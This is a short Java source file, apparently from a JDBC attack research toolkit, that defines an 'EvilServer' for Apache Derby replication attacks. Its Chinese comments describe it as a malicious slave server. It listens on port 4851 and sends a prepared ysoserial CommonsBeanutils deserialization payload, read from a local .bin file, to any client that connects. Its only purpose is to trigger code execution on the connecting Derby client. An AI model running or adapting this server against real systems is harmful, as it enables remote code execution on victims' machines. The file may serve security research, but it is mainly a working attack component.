package org.su18.jdbc.attack.derby;

import java.io.FileInputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.concurrent.TimeUnit;

/**
 * 恶意 slave 服务器，建立连接后直接返回恶意流
 *
 * @author su18
 */
public class EvilServer {

	public static void main(String[] args) throws Exception {
		// 监听端口，默认 4851，可以指定
		int          port   = 4851;
		ServerSocket server = new ServerSocket(port);
		Socket       socket = server.accept();

		// 读取恶意反序列化
		FileInputStream stream = new FileInputStream("/Users/phoebe/IdeaProjects/ysoserial-su18/CommonBeanUtils.bin");
		byte[]          bytes  = new byte[stream.available()];
		stream.read(bytes);

		// 直接向 socket 中写入
		socket.getOutputStream().write(bytes);
		socket.getOutputStream().flush();
		Thread.sleep(TimeUnit.SECONDS.toMillis(5));
		socket.close();
		server.close();
	}

}
